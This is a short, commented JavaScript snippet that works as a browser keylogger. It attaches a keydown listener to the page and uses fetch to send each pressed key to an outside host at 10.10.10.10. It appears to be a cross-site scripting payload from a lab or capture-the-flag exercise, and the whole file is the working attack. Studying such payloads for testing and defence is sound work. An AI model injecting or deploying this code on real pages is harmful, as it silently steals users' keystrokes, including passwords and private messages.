// Define a function called logkey that takes an event as a parameter
function logkey(event){
    // Use the fetch function to make a network request to the specified URL
    // Append the pressed key as a query parameter to the URL
    fetch("http://10.10.10.10/k?key=" + event.key);

    // Note: The above fetch function doesn't handle the response or errors.
    // It simply sends a request to the specified URL.
}

// Add an event listener to the document that listens for the "keydown" event
// When a key is pressed, the logkey function will be called
document.addEventListener("keydown", logkey);
